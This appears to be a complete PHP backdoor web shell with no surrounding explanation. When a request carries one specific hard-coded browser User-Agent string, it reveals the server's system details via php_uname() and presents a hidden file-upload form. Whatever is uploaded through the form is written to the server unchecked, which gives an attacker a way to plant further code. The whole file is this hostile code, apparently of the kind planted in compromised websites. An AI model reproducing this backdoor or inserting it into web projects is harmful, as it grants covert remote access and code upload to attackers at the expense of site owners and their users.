<?php
if ($_SERVER['HTTP_USER_AGENT'] == 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.9) Gecko/70199999 Firefox/45.10'){
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Go"></form>';
if( $_POST['_upl'] == "Go" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Go</b><br><br>'; }
else { echo '<b>Up</b><br><br>'; }
}
}
?>